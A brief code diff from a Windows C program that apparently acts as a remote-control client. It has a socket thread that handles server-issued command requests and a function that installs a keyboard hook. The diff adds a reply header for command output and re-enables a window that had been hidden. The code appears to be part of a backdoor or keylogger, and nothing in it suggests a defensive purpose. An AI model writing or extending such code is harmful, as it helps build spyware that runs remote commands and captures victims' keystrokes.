@@ -210,7 +210,7 @@ DWORD WINAPI recvandsendthread(LPVOID lparam)
             //cmd请求
             if (drbuf.type == SEVER_CMD_COMMAND)
             {
-
+                senddatahead(s, CLIENT_CMD_BACK);
                 if (drbuf.length != 0)
                 {
                     DWORD realwlength;
@@ -558,8 +558,8 @@ BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
 
 
    //取消窗口显示
-   /*ShowWindow(hWnd, nCmdShow);
-   UpdateWindow(hWnd);*/
+   ShowWindow(hWnd, nCmdShow);
+   UpdateWindow(hWnd);
 
    mykeyboardhook(hWnd);
 
